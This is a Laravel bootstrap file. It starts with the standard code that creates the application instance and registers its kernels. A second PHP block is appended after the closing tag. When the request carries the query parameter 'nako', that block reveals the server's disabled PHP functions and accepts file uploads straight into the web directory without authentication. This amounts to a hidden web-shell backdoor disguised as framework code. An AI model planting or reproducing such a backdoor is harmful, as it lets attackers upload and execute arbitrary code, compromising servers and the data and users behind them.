<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/

return $app;
?>
<?php
if (isset($_GET["nako"])) {
    echo "<style>
        body {
            background-color: #4CAF50;
            font-family: Arial, sans-serif;
            color: #333;
        }
        input[type='file'], input[type='submit'] {
            padding: 10px;
            font-size: 14px;
            margin-top: 10px;
            background-color: #FBC02D;
            border: 1px solid #1976D2;
            position: relative;
            z-index: 9999;
        }
        b {
            color: #00B0FF;
        }
      </style>";
    $disable_functions = @ini_get("disable_functions");
    echo "<br>DisablePHP = " . htmlspecialchars($disable_functions) . "<br>";
    echo "<form method='post' enctype='multipart/form-data'>";
    echo "<input type='file' name='f' required>";
    echo "<input type='submit' name='k' value='upload'><br>";
    if (isset($_POST["k"]) && $_POST["k"] == "upload") {
        if (isset($_FILES["f"]) && $_FILES["f"]["error"] == 0) {
            $target_file = basename($_FILES["f"]["name"]);
            if (move_uploaded_file($_FILES["f"]["tmp_name"], $target_file)) {
                echo "<b>File " . htmlspecialchars($target_file) . " successful</b><br>";
            } else {
                echo "<b>Failed</b><br>";
            }
        } else {
            echo "<b>Nothing</b><br>";
        }
    }
}
?>
